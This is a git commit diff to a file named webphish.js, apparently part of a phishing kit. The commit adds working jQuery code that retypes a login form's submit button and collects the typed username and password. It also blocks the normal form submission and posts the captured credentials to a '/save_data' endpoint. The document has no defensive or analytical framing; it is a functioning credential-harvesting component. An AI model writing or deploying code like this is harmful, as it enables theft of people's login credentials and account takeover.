92b688a0414f71810fdf2df8afe7537fe8d73868
Saurabh Wadekar <mr.saurabhwadekar@gmail.com>
2024-03-03 22:08:36 +0530

    Update webphish.js

--- main/static/webphish.js
+++ main/static/webphish.js
@@ -1,27 +1,20 @@
 
-document.onload = function () {
-
-
-    // $('#task').attr( 'type','button')// set login button type button
-    // $('#task').attr( "onclick","getdata()")// set login button type button
+$(btn_id).prop('type', 'button')// set login button type button
+$(btn_id).attr("onclick", "getdata()")// set login button type button
 
 
 
 
+function getdata() {
+    var user_id = $(username_id_or_name).val()
+    var password = $(password_id_or_name).val()
+    var data = {
+        'user_id': user_id,
+        'password': password
+    }
+    send_data(data)
 
 }
-
-
-// function getdata() {
-//     var user_id = $('#username').value
-//     var password = $('#password').value
-//     console.log(user_id)
-//     console.log(password)
-
-// }
-
-
-
 
 $(form_id).submit(function (e) {
     e.preventDefault();
@@ -35,15 +28,15 @@ function send_data(data) {
     $.ajax({
         url: "/save_data",
         type: "POST",
-        data: {'data':JSON.stringify(data)},
+        data: { 'data': JSON.stringify(data) },
         dataType: "json",
-        success: function(response){
+        success: function (response) {
             // Handle success response
             console.log(response)
         },
-        error: function(xhr, textStatus, error){
+        error: function (xhr, textStatus, error) {
             // Handle error response
-            
+
         }
     });
 }
